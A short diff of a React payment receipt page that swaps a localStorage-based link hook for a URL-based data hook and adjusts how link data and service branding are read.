@@ -3,13 +3,13 @@ import { Button } from "@/components/ui/button";
 import { Card } from "@/components/ui/card";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
-import { useLink } from "@/hooks/useLocalStorage";
+import { useLinkData } from "@/hooks/useUrlBasedData";
 import { CheckCircle, Download, ArrowLeft, CreditCard, Calendar, Hash } from "lucide-react";
 
 const PaymentReceiptPage = () => {
   const { id } = useParams();
   const navigate = useNavigate();
-  const { data: linkData } = useLink(id);
+  const { linkData } = useLinkData();
   
   const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
